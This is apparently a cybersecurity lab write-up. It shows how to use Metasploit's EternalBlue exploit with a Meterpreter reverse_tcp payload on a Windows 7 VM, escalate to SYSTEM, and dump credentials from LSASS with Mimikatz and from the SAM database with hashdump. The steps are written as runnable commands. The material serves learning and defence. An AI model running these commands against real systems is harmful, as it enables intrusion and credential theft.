# Extracting Credentials Using Meterpreter and Mimikatz

 ### [YouTube Demonstration](https://youtu.be/Je-QIsPMlzk)
 
## Background

In cybersecurity, understanding how attackers extract credentials from compromised systems is crucial for developing effective defense strategies. Meterpreter, a powerful post-exploitation tool, allows attackers to interact with compromised Windows systems and perform various tasks, including extracting sensitive data like password hashes. Mimikatz, a popular credential extraction tool, can be used through Meterpreter to dump password hashes from LSASS memory and the SAM database.

## Project Overview

In this project, I used Meterpreter to obtain a session on a Windows 7 virtual machine and then used Mimikatz to dump credentials from the LSASS memory and the SAM database. The aim was to demonstrate how attackers use Meterpreter and Mimikatz for credential extraction and to gain practical experience in post-exploitation activities.

## Steps Taken

1. **Gain Meterpreter Session**:
   - Launched Metasploit and used an appropriate exploit to gain a Meterpreter session on the Windows 7 virtual machine.

    ```plaintext
    msfconsole
    use exploit/windows/smb/ms17_010_eternalblue
    set RHOST <target_ip>
    set payload windows/meterpreter/reverse_tcp
    set LHOST <your_ip>
    set LPORT <your_port>
    exploit
    ```

2. **Escalate Privileges to SYSTEM**:
   - Used the `getsystem` command within the Meterpreter session to escalate privileges to SYSTEM level.

    ```plaintext
    getsystem
    ```

3. **Verify Privileges**:
   - Used the `getuid` command to display the current user's privileges and confirmed that SYSTEM privileges were obtained.

    ```plaintext
    getuid
    ```

4. **Extract Credentials from LSASS**:
   - Used Mimikatz commands within the Meterpreter session to extract usernames and password hashes from the LSASS memory.

    ```plaintext
    load mimikatz
    mimikatz_command -f sekurlsa::logonpasswords
    ```

5. **Dump Password Hashes from SAM Database**:
   - Used the `hashdump` command in Meterpreter to dump password hashes from the SAM database.

    ```plaintext
    hashdump
    ```

## Validation

- Verified that the `getuid` output indicated SYSTEM privileges.
- Successfully obtained credentials from the LSASS process using Mimikatz.
- Confirmed password hashes were obtained from the SAM database using the `hashdump` command.

## Learning Objectives Achieved

- **Credential Extraction**: Gained hands-on experience in using Meterpreter and Mimikatz to extract credentials from compromised systems.
- **Post-Exploitation**: Understood how attackers use post-exploitation tools to perform advanced tasks like credential theft.

